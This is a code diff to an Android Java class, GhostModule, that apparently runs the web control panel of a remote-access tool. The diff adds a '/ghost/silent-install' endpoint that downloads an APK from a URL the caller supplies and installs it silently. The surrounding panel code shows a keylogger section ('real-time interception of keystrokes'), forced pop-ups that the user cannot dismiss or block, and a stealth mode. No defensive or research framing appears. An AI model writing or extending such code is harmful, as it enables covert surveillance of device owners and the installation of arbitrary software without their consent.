@@ -46,6 +46,13 @@ public class GhostModule extends BaseModule {
             return serveInspectorTree();
         } else if (uri.equals("/ghost/interact")) {
             return performInteraction(params);
+        } else if (uri.equals("/ghost/silent-install")) {
+            String apkUrl = params.get("url");
+            if (apkUrl != null && !apkUrl.trim().isEmpty()) {
+                com.labs.labrats.PrivilegedInstaller.downloadAndSilentInstallAsync(context, apkUrl);
+                return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"SILENT_INSTALL_DISPATCHED\"}");
+            }
+            return newResponse(Response.Status.BAD_REQUEST, "application/json", "{\"success\": false, \"message\": \"URL required\"}");
         } else if (uri.equals("/stealth")) {
             return toggleStealthMode(params);
         }
@@ -473,7 +480,7 @@ public class GhostModule extends BaseModule {
 
         // --- GHOST TOAST CARD ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 50px;\">");
-        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.15rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
+        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.35rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
         
         html.append("<style>");
         html.append("  input[type='range'] { height: 30px; -webkit-appearance: none; background: transparent; cursor: pointer; }");
@@ -546,7 +553,7 @@ public class GhostModule extends BaseModule {
         // Ghost Keylogs Section
         html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
         html.append("<div class=\"flex-header\">");
-        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.15rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
+        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
         html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
         html.append("</div>");
         
